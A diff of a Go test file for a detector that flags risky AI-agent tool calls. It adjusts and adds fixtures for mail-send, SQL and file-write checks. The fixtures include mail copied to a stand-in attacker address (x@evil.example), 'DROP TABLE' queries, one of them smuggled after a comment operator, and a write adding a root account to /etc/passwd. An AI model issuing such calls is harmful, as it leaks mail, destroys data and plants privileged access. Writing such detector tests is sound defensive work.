@@ -228,7 +228,7 @@ func TestNonShellToolReviewFixes(t *testing.T) {
 	}
 	// Every copy and recipient field is read; naming the attacker in "to" proves nothing.
 	for _, args := range []string{
-		`{"recipients":["a@corp.example"],"cc":"x@evil.example"}`,
+		`{"recipients":["a@corp.example"],"bcc":"x@evil.example"}`,
 		`{"to":"a@corp.example","forward_to":"x@evil.example"}`,
 	} {
 		if got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", args, false), nil, ""); !has(got, mcpSendRedirectRuleID) {
@@ -277,6 +277,8 @@ func TestNonShellToolRound2Quiet(t *testing.T) {
 		{"large issue body", "mcp__github__create_issue", bigArgs(map[string]string{"title": "t", "body": big})},
 		{"large evaluate script", "mcp__playwright__browser_evaluate", bigArgs(map[string]string{"function": big})},
 		{"cc to the recipient's domain", "mcp__mail__send", `{"to":"a@corp.example","cc":"b@corp.example"}`},
+		{"cc to a colleague, to a list of external recipients", "mcp__mail__send", `{"to":"a@x.com, b@y.com","cc":"c@acme.ai"}`},
+		{"prose that starts with a bracket and a python literal", "mcp__acme__note", `{"html":"[formatted HTML content]","d":"[{'k': 'v'}]"}`},
 		{"bcc to the recipient's domain", "mcp__mail__send", `{"to":"a@corp.example","bcc":"b@corp.example"}`},
 		{"callback on the call's own API", "mcp__http__post", `{"url":"https://api.corp.example/v1/x","callback_url":"https://api.corp.example/hook"}`},
 		{"search prose", "mcp__acme__search_issues", `{"query":"drop table of contents"}`},
@@ -307,7 +309,7 @@ func TestNonShellToolRound2Loud(t *testing.T) {
 		{"bigquery generic key", "mcp__bigquery__query", `{"query":"DROP TABLE t"}`, mcpSQLDestructiveRuleID},
 		{"postgres operator then drop", "mcp__postgres-prod__query", `{"query":"SELECT 1 # 1; DROP TABLE t"}`, mcpSQLDestructiveRuleID},
 		{"edit_file body under a proxy", "mcp__proxy__call_tool", `{"name":"write","arguments":{"path":"/etc/passwd","content":"svc:x:0:0::/:/bin/sh"}}`, "PATH-ETC-PASSWD"},
-		{"copy outside the recipients with a known account", "mcp__mail__send", `{"from":"me@corp.example","to":"a@corp.example","cc":"x@evil.example"}`, mcpSendRedirectRuleID},
+		{"copy outside the recipients with a known account", "mcp__mail__send", `{"from":"me@corp.example","to":"a@corp.example","bcc":"x@evil.example"}`, mcpSendRedirectRuleID},
 	} {
 		t.Run(c.name, func(t *testing.T) {
 			if got := nonShellToolFindings(ctx, nonShellReq(c.tool, c.args, false), nil, ""); !has(got, c.rule) {
